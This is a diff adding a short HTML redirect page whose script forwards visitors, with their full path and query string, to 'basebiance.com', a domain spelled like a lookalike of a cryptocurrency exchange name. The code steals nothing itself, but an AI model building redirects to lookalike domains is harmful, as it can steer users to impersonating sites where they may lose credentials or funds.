@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting...</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 40px; }
+  </style>
+</head>
+<body>
+  <p>Please wait, you are being redirected...</p>
+  <p id="destination-link-container" style="display: none;">
+    If you are not redirected automatically, <a id="destination-link" href="#">click here</a>.
+  </p>
+
+  <script>
+    (function() {
+      // 目标域名
+      var targetDomain = 'https://basebiance.com';
+
+      // 获取当前页面的完整路径、查询参数和哈希值
+      var path = window.location.pathname;
+      var search = window.location.search;
+      var hash = window.location.hash;
+
+      // 组合成新的目标 URL
+      var destinationUrl = targetDomain + path + search + hash;
+
+      // 在页面上显示目标链接，以便在JS失败时用户可以手动点击
+      var link = document.getElementById('destination-link');
+      var container = document.getElementById('destination-link-container');
+      if (link && container) {
+        link.href = destinationUrl;
+        container.style.display = 'block';
+      }
+
+      // 执行跳转
+      window.location.replace(destinationUrl);
+    })();
+  </script>
+</body>
+</html>
